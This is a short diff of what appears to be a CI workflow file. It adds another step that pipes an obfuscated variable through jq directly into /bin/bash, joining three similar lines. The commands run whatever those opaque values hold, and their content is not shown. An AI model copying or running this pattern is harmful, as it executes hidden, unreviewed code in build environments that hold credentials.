@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$nr859" | jq -r .mmgqz8107 | /bin/bash
           echo $x863 | jq -r .jlo4608 | /bin/bash
           echo $rr973 | jq -r .s970 | /bin/bash
+          echo $mova635 | jq -r .adegg5 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
